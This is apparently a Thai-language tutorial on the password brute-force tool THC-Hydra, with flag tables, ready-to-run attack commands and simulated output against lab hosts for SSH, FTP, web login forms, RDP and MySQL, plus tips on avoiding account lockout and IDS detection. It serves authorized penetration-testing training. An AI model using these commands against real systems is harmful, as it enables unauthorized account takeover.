คู่มือ Hydra (THC-Hydra)

เครื่องมือ Brute-force / Credential Testing บน Kali Linux

Online Password Attack
⚠️ คำเตือนสำคัญก่อนใช้งาน

Hydra ใช้สำหรับทดสอบความปลอดภัยของระบบที่คุณเป็นเจ้าของ หรือได้รับอนุญาตเป็นลายลักษณ์อักษร (authorized penetration test / CTF lab / TryHackMe / HackTheBox / Metasploitable / DVWA ที่ติดตั้งเอง) เท่านั้น

การ brute-force เข้าระบบของผู้อื่นโดยไม่ได้รับอนุญาตเป็นความผิดตาม พ.ร.บ.คอมพิวเตอร์ (และกฎหมายลักษณะเดียวกันในประเทศอื่น) ไม่ว่าจะสำเร็จหรือไม่ก็ตาม ตัวอย่าง IP ในคู่มือนี้ทั้งหมดเป็น IP สมมติของเครื่องแล็บส่วนตัว (เช่น 10.10.10.5 / 192.168.56.x)

1. Hydra คืออะไร

Hydra (THC-Hydra) เป็นเครื่องมือ "online password cracking" ทำงานโดยยิง username/password หลายๆ ชุดเข้าระบบที่เปิดให้ login ผ่านโปรโตคอลต่างๆ (network service) แบบเรียลไทม์ ต่างจาก John the Ripper หรือ Hashcat ที่ crack hash แบบ offline

จุดเด่น

  • รองรับโปรโตคอลกว่า 50 ชนิด (ssh, ftp, http-get/post, rdp, mysql, smb, telnet, pop3, vnc ฯลฯ)
  • รันแบบ multi-thread พร้อมกันได้ (เร็ว)
  • ใช้ wordlist (เช่น rockyou.txt) หรือกำหนด pattern เองได้
ติดตั้งใน Kali (ปกติมีอยู่แล้ว) 
sudo apt update && sudo apt install hydra -y
ตรวจสอบเวอร์ชัน 
hydra -h

2. Syntax พื้นฐาน

hydra [OPTIONS] [LOGIN/PASS OPTIONS] [TARGET] [SERVICE] [PARAM]
รูปแบบทั่วไป 
hydra -l <user> -P <wordlist> <target_ip> <service>
hydra -L <userlist> -p <password> <target_ip> <service>
hydra -L <userlist> -P <wordlist> <target_ip> <service>

3. คำอธิบาย Flag ทั้งหมด (ละเอียด)

กลุ่ม Username

Flagความหมายตัวอย่าง
-l LOGINระบุ username ตัวเดียว (lowercase L)-l admin
-L FILEระบุไฟล์ wordlist ของ username (uppercase L)-L users.txt

กลุ่ม Password

Flagความหมายตัวอย่าง
-p PASSระบุ password ตัวเดียว (lowercase p)-p 123456
-P FILEระบุไฟล์ wordlist ของ password (uppercase P)-P rockyou.txt
-e nsr ลองรูปแบบเสริมอัตโนมัติ:
  • n = null password (รหัสว่าง)
  • s = same as login (รหัส = username)
  • r = reverse login (รหัส = username สลับตัวอักษร)
 -e nsr

กลุ่มควบคุมความเร็ว / Threads

Flagความหมายตัวอย่าง
-t TASKSจำนวน thread พร้อมกัน (default 16) ยิ่งสูงยิ่งเร็วแต่เสี่ยง false negative/บริการล่ม-t 4
-w TIMEเวลารอ response สูงสุดต่อการเชื่อมต่อ (วินาที)-w 30
-W TIMEเวลาหน่วงระหว่างการเชื่อมต่อแต่ละ thread—
-c TIMEหน่วงเวลาระหว่างการลองแต่ละครั้ง ใช้เลี่ยง lockout policy-c 3

กลุ่มเป้าหมาย / พอร์ต

Flagความหมายตัวอย่าง
-s PORTกำหนดพอร์ตที่ไม่ใช่ default ของ service นั้น-s 2222
-Sใช้ SSL/TLS เชื่อมต่อ (https, ftps)—

กลุ่มผลลัพธ์ / Output

Flagความหมายตัวอย่าง
-o FILEบันทึกผลลัพธ์ที่เจอลงไฟล์-o result.txt
-fหยุดทันทีเมื่อเจอ 1 คู่ user/pass ที่ใช้ได้—
-Fหยุดทันทีเมื่อเจอคู่ที่ใช้ได้ในทุก host (กรณีมีหลาย target)—
-v / -Vแสดงผล verbose (V ใหญ่ = แสดงทุกครั้งที่ลอง)—
-qquiet mode ลด error message ที่ไม่จำเป็น—

อื่นๆ

Flagความหมายตัวอย่าง
-x MIN:MAX:CHARSETสร้าง password แบบ brute-force ตาม pattern-x 4:6:a1
-M FILEระบุไฟล์รายชื่อ target หลายเครื่อง (mass attack)—
-Rresume การโจมตีที่หยุดไปก่อนหน้า (อ่านจาก hydra.restore)—

4. ตัวอย่างการใช้งานแยกตามโปรโตคอล

4.1 SSH (พอร์ต default 22)

สถานการณ์: แล็บทดสอบ Metasploitable2 ที่ IP 10.10.10.5 ทราบ username "msfadmin" ต้องการหา password จาก wordlist
คำสั่ง 
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
      -t 4 -V ssh://10.10.10.5
อธิบายคำสั่ง
  • -l msfadmin → username ที่รู้แล้ว
  • -P rockyou.txt → wordlist password
  • -t 4 → จำกัด 4 threads (SSH มัก rate-limit ถ้าแรงไป)
  • -V → verbose แสดงทุกครั้งที่ลอง
  • ssh://10.10.10.5 → target และ protocol
ตัวอย่างผลลัพธ์ (จำลอง) 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login
tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.10.5:22/
[ATTEMPT] target 10.10.10.5 - login "msfadmin" - pass "123456" - 1 of 14344399
[ATTEMPT] target 10.10.10.5 - login "msfadmin" - pass "12345"  - 2 of 14344399
[ATTEMPT] target 10.10.10.5 - login "msfadmin" - pass "password" - 3 of 14344399
...
[22][ssh] host: 10.10.10.5   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-06-25 10:42:11
การอ่านผลลัพธ์
  • บรรทัด [DATA] บอกจำนวน combination ทั้งหมดที่ต้องลอง
  • บรรทัด [ATTEMPT] (เห็นเพราะ -V) คือทุกครั้งที่ทดลอง
  • บรรทัด [22][ssh] host: ... คือ "เจอแล้ว" รูปแบบคือ [พอร์ต][โปรโตคอล] host: IP login: USER password: PASS
  • สรุปท้ายบอกจำนวน target ที่สำเร็จ
ตัวอย่างกรณีระบุ username list ด้วย 
hydra -L users.txt -P rockyou.txt -t 4 -o ssh_result.txt ssh://10.10.10.5

4.2 FTP (พอร์ต default 21)

สถานการณ์: เครื่องแล็บ 10.10.10.5 เปิด FTP ไม่ทราบรหัสของ user "ftpuser"
คำสั่ง 
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt \
      -t 16 ftp://10.10.10.5
ตัวอย่างผลลัพธ์ (จำลอง) 
[DATA] max 16 tasks per 1 server, overall 16 tasks
[DATA] attacking ftp://10.10.10.5:21/
[21][ftp] host: 10.10.10.5   login: ftpuser   password: letmein
1 of 1 target successfully completed, 1 valid password found
ทดสอบ anonymous login (เร็วและไม่ต้องเดารหัส) 
hydra -l anonymous -p anonymous ftp://10.10.10.5
ระบุพอร์ต FTP ที่ไม่ใช่ default (เช่น 2121) 
hydra -l ftpuser -P rockyou.txt -s 2121 ftp://10.10.10.5

4.3 HTTP (Web Login Form) — POST method

สถานการณ์: เว็บแอป DVWA บน 10.10.10.5 มีหน้า login ที่
  • Path: /dvwa/login.php
  • Field username: username
  • Field password: password
  • ข้อความเมื่อ login ผิด: "Login failed"
คำสั่ง 
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      10.10.10.5 http-post-form \
      "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
อธิบายโครงสร้าง http-post-form (3 ส่วน คั่นด้วย ':')
  • ส่วนที่ 1: path ของหน้า login → /dvwa/login.php
  • ส่วนที่ 2: body ที่ส่งไปแบบ POST โดยแทนตำแหน่ง username/password ด้วย ^USER^ และ ^PASS^ ตามชื่อ field จริงของฟอร์ม
  • ส่วนที่ 3: "Login failed" = string ที่บอกว่า "ล็อกอินไม่สำเร็จ" (Hydra ถือว่าสำเร็จเมื่อ response "ไม่" มี string นี้)

ถ้าเว็บใช้ GET form แทน POST ให้เปลี่ยนเป็น http-get-form ด้วย syntax เดียวกัน

ตัวอย่างผลลัพธ์ (จำลอง) 
[DATA] attacking http-post-form://10.10.10.5:80/dvwa/login.php
[80][http-post-form] host: 10.10.10.5   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
กรณีต้องแนบ cookie (เช่น session ที่ได้จาก curl/burp) 
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
      "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed:H=Cookie: PHPSESSID=abc123"

4.4 RDP (Remote Desktop, พอร์ต default 3389)

สถานการณ์: เครื่อง Windows แล็บ 10.10.10.20 เปิด RDP ทราบ username "administrator"
คำสั่ง 
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
      -t 4 rdp://10.10.10.20
หมายเหตุสำคัญ
  • RDP มักมี account lockout policy ควรใช้ -t ต่ำๆ (2-4) และเพิ่ม -c (delay) เพื่อเลี่ยง lockout
  • บาง build ต้องใช้ module rdp ผ่าน freerdp library ถ้า error "rdp module not compiled": 
    sudo apt install libfreerdp-dev
ตัวอย่างผลลัพธ์ (จำลอง) 
[DATA] max 4 tasks per 1 server, overall 4 tasks
[DATA] attacking rdp://10.10.10.20:3389/
[3389][rdp] host: 10.10.10.20   login: administrator   password: P@ssw0rd!
1 of 1 target successfully completed, 1 valid password found

4.5 MySQL (พอร์ต default 3306)

สถานการณ์: เครื่อง 10.10.10.5 รัน MySQL ทราบ user "root" ต้องการหา password
คำสั่ง 
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      -t 4 mysql://10.10.10.5
ตัวอย่างผลลัพธ์ (จำลอง) 
[DATA] max 4 tasks per 1 server, overall 4 tasks
[DATA] attacking mysql://10.10.10.5:3306/
[3306][mysql] host: 10.10.10.5   login: root   password: (empty password)
1 of 1 target successfully completed, 1 valid password found
ทดสอบ empty password อย่างเดียวก่อน (เร็วมาก) 
hydra -l root -p "" mysql://10.10.10.5

5. การอ่านผลลัพธ์ Hydra โดยรวม (สรุป)

รูปแบบบรรทัดที่ "เจอ" credential จะเป็นแบบนี้เสมอ:

[PORT][service] host: TARGET_IP   login: USERNAME   password: PASSWORD
ตัวอย่าง 
[22][ssh] host: 10.10.10.5   login: msfadmin   password: msfadmin
ส่วนความหมาย
[22][ssh]พอร์ต 22 โปรโตคอล ssh
host: ...IP เป้าหมาย
login: ...username ที่ใช้ได้
password: ...password ที่ใช้ได้

ท้ายผลลัพธ์จะมีสรุปเสมอ เช่น:

1 of 1 target successfully completed, 1 valid password found

ถ้าไม่เจอเลยจะแสดง:

0 of 1 target successfully completed, 0 valid passwords found

6. เทคนิคและข้อควรระวังเพิ่มเติม

  • ใช้ -t ต่ำๆ (4-8) กับ SSH/RDP เพื่อลดโอกาสถูก IDS/IPS บล็อก หรือถูก lockout policy ล็อกบัญชี
  • ใช้ -o บันทึกผลเก็บไว้ทุกครั้ง เผื่อ session หลุดจะไม่ต้องรันใหม่
  • รวมกับ nmap ก่อนเสมอ เพื่อยืนยันว่าพอร์ต/service เปิดจริงและตรงเวอร์ชัน 
    nmap -sV -p- 10.10.10.5
